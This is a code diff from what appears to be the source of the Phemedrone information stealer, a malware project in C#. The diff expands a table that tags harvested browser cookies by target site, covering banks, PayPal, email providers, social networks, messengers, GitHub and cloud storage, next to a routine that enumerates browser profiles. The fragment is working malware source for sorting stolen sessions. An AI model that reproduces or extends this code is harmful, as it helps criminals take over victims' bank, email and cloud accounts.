@@ -80,6 +80,67 @@ namespace Phemedrone.Extensions
             return content;
         }
 
+        private static Dictionary<string, string> _tags = new() // you can add tag example: {"domain", "TAG IN LOG"}
+        {
+            {"roblox.com", "GAMES"},
+            {"steampowered.com", "GAMES"},
+            {"steamcommunity.com", "GAMES"},
+            {"genshin", "GAMES"},
+            {"epicgames.com", "GAMES"},
+            {"qiwi", "BANK"},
+            {"tinkoff", "BANK"},
+            {"yoomoney", "BANK"},
+            {"sberbank", "BANK"},
+            {"funpay", "MONEY"},
+            {"paypal", "MONEY"},
+            {"americanexpress", "MONEY"},
+            {"amazon", "MONEY"},
+            {"spotify", "MUSIC"},
+            {"music.apple", "MUSIC"},
+            {"celka.", "CHEATS"},
+            {"nursultan.", "CHEATS"},
+            {"xone", "CHEATS"},
+            {"akrien", "CHEATS"},
+            {"interium", "CHEATS"},
+            {"nixware", "CHEATS"},
+            {"expensive.", "CHEATS"},
+            {"gamesense", "CHEATS"},
+            {"neverlose", "CHEATS"},
+            {"royalhack.net", "CHEATS"},
+            {"xhook.net", "CHEATS"},
+            {"nullcore.net", "CHEATS"},
+            {"youtube", "YOUTUBE"},
+            {"minecraft.net", "GAMES"},
+            {"facebook.com", "SOCIALS"},
+            {"twitter.com", "SOCIALS"},
+            {"instagram.com", "SOCIALS"},
+            {"vk.com", "SOCIALS"},
+            {"ok.ru", "SOCIALS"},
+            {"reddit.com", "SOCIALS"},
+            {"web.telegram.org", "MESSENGER"},
+            {"discord.com", "MESSENGER"},
+            {"skype.com", "MESSENGER"},
+            {"im.qq.com", "MESSENGER"},
+            {"mail.google.com", "EMAIL"},
+            {"mail.ru", "EMAIL"},
+            {"mail.proton.me", "EMAIL"},
+            {"yahoo.com", "EMAIL"},
+            {"github.com", "CLOUD"},
+            {"bitbucket.org", "CLOUD"},
+            {"sourceforge.net", "CLOUD"},
+            {"inflectra.com", "CLOUD"},
+            {"beanstalkapp.com", "CLOUD"},
+            {"trac.edgewall.org", "CLOUD"},
+            {"codegiant.io", "CLOUD"},
+            {"notabug.org", "CLOUD"},
+            {"gitlab.com", "CLOUD"},
+            {"0xacab.org", "CLOUD"},
+            {"drive.proton.me", "CLOUD"},
+            {"dropbox.com", "CLOUD"},
+            {"mega.io", "CLOUD"},
+            {"cloud.google.com", "CLOUD"}
+        };
+
         public static List<string> ListBrowsers(string rootLocation, Func<string, bool> performCheck)
         {
             var browserLocations = new List<string>();
@@ -115,34 +176,6 @@ namespace Phemedrone.Extensions
             return browserLocations;
         }
 
-        private static Dictionary<string, string> _tags = new() // you cann add tag example: {"domain", "TAG IN LOG"}
-        {
-            {"robloc.com", "ROBLOX"},
-            {"steampowered.com", "GAMES"},
-            {"genshin", "GAMES"},
-            {"epicgames.com", "GAMES"},
-            {"qiwi", "BANK"},
-            {"tinkoff", "BANK"},
-            {"yoomoney", "BANK"},
-            {"sberbank", "BANK"},
-            {"funpay", "MONEY"},
-            {"paypal", "MONEY"},
-            {"americanexpress", "MONEY"},
-            {"amazon", "MONEY"},
-            {"spotify", "MUSIC"},
-            {"music.apple", "MUSIC"},
-            {"celka.", "CHEATS"},
-            {"nursultan.", "CHEATS"},
-            {"xone", "CHEATS"},
-            {"akrien", "CHEATS"},
-            {"interium", "CHEATS"},
-            {"nixware", "CHEATS"},
-            {"expensive.", "CHEATS"},
-            {"gamesense", "CHEATS"},
-            {"neverlose", "CHEATS"},
-            {"youtube", "YOUTUBE"},
-            {"minecraft.net", "GAMES"}
-        };
         public static void CookiesTags(string url)
         {
             if (_tags.TryGetValue(url, out var tag))
